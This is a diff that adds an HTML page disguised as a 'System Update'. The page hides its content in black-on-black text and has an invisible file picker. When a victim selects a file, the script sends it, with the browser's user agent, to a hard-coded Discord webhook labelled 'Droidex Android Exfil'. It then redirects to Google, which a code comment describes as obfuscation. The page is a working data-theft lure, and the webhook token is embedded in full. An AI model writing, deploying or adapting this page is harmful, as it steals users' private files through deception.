@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Update</title>
+    <style>body { background: #000; color: #000; }</style>
+</head>
+<body>
+    <input type="file" id="fileInput" style="opacity: 0;">
+
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX";
+
+        document.getElementById('fileInput').onchange = function() {
+            const file = this.files[0];
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('content', `**Droidex Android Exfil**\nHost: ${navigator.userAgent}\nArquivo: ${file.name}`);
+
+            fetch(webhook, {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                // Ofuscação: Redireciona após o envio
+                window.location.href = "https://www.google.com";
+            }).catch(() => {
+                window.location.href = "https://www.google.com";
+            });
+        };
+    </script>
+</body>
+</html>
